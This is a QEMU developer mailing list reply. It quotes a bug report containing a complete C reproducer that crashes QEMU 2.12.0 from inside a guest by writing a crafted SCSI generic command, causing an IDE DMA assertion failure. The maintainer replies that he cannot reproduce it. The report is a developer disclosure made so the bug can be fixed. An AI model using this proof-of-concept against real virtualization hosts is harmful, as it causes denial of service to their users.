Received: from eggs.gnu.org ([2001:4830:134:3::10]:45834)
	by lists.gnu.org with esmtp (Exim 4.71)
	(envelope-from <jsnow@redhat.com>) id 1fV2OA-0008Mq-5E
	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 18:12:43 -0400
Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
	(envelope-from <jsnow@redhat.com>) id 1fV2O9-0004zw-3I
	for qemu-devel@nongnu.org; Mon, 18 Jun 2018 18:12:42 -0400
References: <5b265059.1c69fb81.adb67.76bf@mx.google.com>
From: John Snow <jsnow@redhat.com>
Message-ID: <e588e551-5340-1232-acfa-a7f5ebe9ddf8@redhat.com>
Date: Mon, 18 Jun 2018 18:12:35 -0400
MIME-Version: 1.0
In-Reply-To: <5b265059.1c69fb81.adb67.76bf@mx.google.com>
Content-Type: text/plain; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: quoted-printable
Subject: Re: [Qemu-devel] Denial of service in hw/ide/core.c
List-Id: <qemu-devel.nongnu.org>
List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
	<mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
List-Archive: <http://lists.nongnu.org/archive/html/qemu-devel/>
List-Post: <mailto:qemu-devel@nongnu.org>
List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
	<mailto:qemu-devel-request@nongnu.org?subject=subscribe>
To: air icy <icytxw@gmail.com>, "qemu-block@nongnu.org" <qemu-block@nongnu.org>, "qemu-devel@nongnu.org" <qemu-devel@nongnu.org>



On 06/17/2018 08:13 AM, air icy wrote:
>=20
> Hi,
> QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qem=
u-2.12.0
> run the program in qemu-2.12.0:
>=20
> #define _GNU_SOURCE
> #include <endian.h>
> #include <sys/syscall.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <stdio.h>
> #include <string.h>
> #include <sys/stat.h>
> #include <stdint.h>
> #include <string.h>
> static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
> {
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0if (a0 =3D=3D 0xc || a0=
 =3D=3D 0xb) {
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0char buf[128];
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "ch=
ar" : "block", (uint8_t)a1, (uint8_t)a2);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0return open(buf, O_RDWR, 0);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0} else {
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0char buf[1024];
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0char* hash;
> strncpy(buf, (char*)a0, sizeof(buf) - 1);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0buf[sizeof(buf) - 1] =3D 0;
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0while ((hash =3D strchr(buf, '#'))) {
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0*=
hash =3D '0' + (char)(a1 % 10);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0a=
1 /=3D 10;
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0}
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0return open(buf, a2, 0);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0}
> }
> uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
> void loop()
> {
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0long res =3D 0;
> memcpy((void*)0x20000000, "/dev/sg#", 9);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0res =3D syz_open_dev(0x=
20000000, 0, 2);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0if (res !=3D -1)
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0r[0] =3D res;
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0res =3D syscall(__NR_du=
p2, r[0], r[0]);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0if (res !=3D -1)
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
=C2=A0=C2=A0=C2=A0=C2=A0r[1] =3D res;
> *(uint8_t*)0x20000ec0 =3D 0;
> *(uint8_t*)0x20000ec1 =3D 0;
> *(uint8_t*)0x20000ec2 =3D 0;
> *(uint8_t*)0x20000ec3 =3D 0;
> *(uint32_t*)0x20000ec8 =3D 0;
> *(uint8_t*)0x20000ed8 =3D 0;
> *(uint8_t*)0x20000ed9 =3D 0;
> *(uint8_t*)0x20000eda =3D 0;
> *(uint8_t*)0x20000edb =3D 0;
> memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67=
\xb3", 12);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0syscall(__NR_write, r[1=
], 0x20000ec0, 0x323);
> }
> int main()
> {
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0syscall(__NR_mmap, 0x20=
000000, 0x1000000, 3, 0x32, -1, 0);
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0loop();
> =C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0return 0;
> }
>=20
> this will crash qemu, output information:
> =C2=A0qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n *=
 512 =3D=3D s->sg.size' failed.
> Thanks
> owl337
>=20
>=20

Hi, I haven't had any luck reproducing this using this strategy. You've
provided several different versions of a reproducer, which one is the
correct one to be using?
